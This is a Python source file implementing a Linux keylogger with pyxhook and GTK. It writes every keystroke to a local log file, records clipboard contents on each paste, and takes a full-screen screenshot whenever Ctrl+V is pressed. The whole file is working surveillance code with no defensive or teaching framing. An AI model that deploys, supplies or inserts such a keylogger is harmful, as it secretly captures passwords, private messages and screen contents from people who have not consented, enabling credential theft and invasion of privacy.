import os
import atexit
import pyxhook
import gi
gi.require_version('Gtk', '3.0')
gi.require_version('Gdk', '3.0')
from gi.repository import Gtk, Gdk

# Path to the log file
log_file = 'log.txt'
log_fh = open(log_file, 'a')

# Clipboard
cb = Gtk.Clipboard.get(Gdk.SELECTION_CLIPBOARD)

# Path to the directory for screenshots
os.makedirs("screenshots", exist_ok=True)
win = Gdk.get_default_root_window()
h = win.get_height()
w = win.get_width()

# State of the Ctrl key, req. for detecting paste operation
ctrl_set = 0

special_keys = ['Shift_L', 'Shift_R', 'Control_L', 'Control_R',
                'Alt_L', 'Alt_R', 'Super_L', 'Super_R',
                'Escape', 'Tab', 'Caps_Lock', 'Insert', 'Delete',
                'Print', 'Up', 'Down', 'Left', 'Right',
                'F1', 'F2', 'F3', 'F4',
                'F5', 'F6', 'F7', 'F8',
                'F9', 'F10', 'F11', 'F12']

symbols = {'grave': '`', 'asciitilde': '~', 'exclam': '!', 'at': '@', 'numbersign': '#',
           'dollar': '$', 'percent': '%', 'asciicircum': '^', 'ampersand': '&', 'asterisk': '*',
           'parenleft': '(', 'parenright': ')', 'minus': '-', 'equal': '=', 'underscore': '_',
           'plus': '+', 'bracketleft': '[', 'bracketright': ']', 'braceleft': '{', 'braceright': '}',
           'backslash': '\\', 'bar': '|', 'semicolon': ';', 'colon': ':', 'apostrophe': "'",
           'quotedbl': '"', 'comma': ',', 'period': '.', 'less': '<', 'greater': '>',
           'slash': '/', 'question': '?'}


# On exit tasks
def exit_handler():
    log_fh.close()


atexit.register(exit_handler)


def on_keyboard_event(event):

    global ctrl_set

    try:
        # Enter key
        if event.Key == 'Return':
            log_fh.write("\n")

        elif event.Key == 'space':
            log_fh.write(" ")

        elif event.Key == 'BackSpace':
            log_fh.write("<-")

        elif event.Key == 'v' or event.Key == 'V':
            content = cb.wait_for_text()
            # Paste operation
            if ctrl_set == 1:
                # Take a screenshot
                pb = Gdk.pixbuf_get_from_window(win, 0, 0, w, h)
                if pb is not None:
                    pb.savev("screenshots/ss{}.png".format(get_ss_count()), "png", (), ())
                # Log clipboard content
                log_fh.write("Paste: " + str(content))

            else:
                log_fh.write(event.Key)

        # To differentiate the special key presses from normal text
        elif event.Key in special_keys:
            log_fh.write("<" + event.Key + ">")
            if event.Key.startswith('Control'):
                # Set ctrl_set = 1 and exit the function
                raise ValueError

        # Write the actual symbols instead of names
        elif event.Key in symbols:
            log_fh.write(symbols.get(event.Key))

        else:
            log_fh.write(event.Key)

        ctrl_set = 0

    except ValueError:
        ctrl_set = 1


def get_ss_count():
    # Create file if not exists
    try:
        fh = open("screenshots/ss_count.txt", "x")
        fh.write("1")
        fh.close()
        return 0
    except FileExistsError:
        # Read count
        fh = open("screenshots/ss_count.txt", "r")
        count = fh.readline()
        fh.close()
        try:
            count = int(count.strip())
        # If count value gets corrupted, set to 1
        except ValueError:
            fh = open("screenshots/ss_count.txt", "w")
            fh.write("1")
            fh.close()
            return 0
        # Write count + 1
        fh = open("screenshots/ss_count.txt", "w")
        fh.write("{}".format(count + 1))
        fh.close()
        return count


def main():
    hook_man = pyxhook.HookManager()
    hook_man.KeyDown = on_keyboard_event
    hook_man.HookKeyboard()
    hook_man.start()


if __name__ == "__main__":
    main()
